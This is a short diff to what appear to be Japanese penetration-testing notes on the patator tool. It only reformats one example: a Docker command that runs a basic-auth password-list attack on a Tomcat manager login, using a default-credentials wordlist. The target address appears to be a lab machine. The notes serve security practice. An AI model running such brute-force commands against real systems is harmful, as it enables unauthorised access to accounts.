@@ -173,7 +173,7 @@ Module options:
 ERROR: wrong usage. Please read the README inside for more information.
 ```
 examples  
-basic認証のパスワードリスト攻撃
-```sh
-sudo docker run -it --rm -v $PWD/SecLists/Passwords:/mnt patator http_fuzz url=http://10.129.136.9:8080/manager/html user_pass=COMBO00:COMBO01 0=/mnt/Default-Credentials/tomcat-betterdefaultpasslist.txt -x ignore:code=401 -x ignore:code=403 auth_type=basic
-```
+- basic認証のパスワードリスト攻撃
+  ```sh
+  sudo docker run -it --rm -v $PWD/SecLists/Passwords:/mnt patator http_fuzz url=http://10.129.136.9:8080/manager/html user_pass=COMBO00:COMBO01 0=/mnt/Default-Credentials/tomcat-betterdefaultpasslist.txt -x ignore:code=401 -x ignore:code=403 auth_type=basic
+  ```
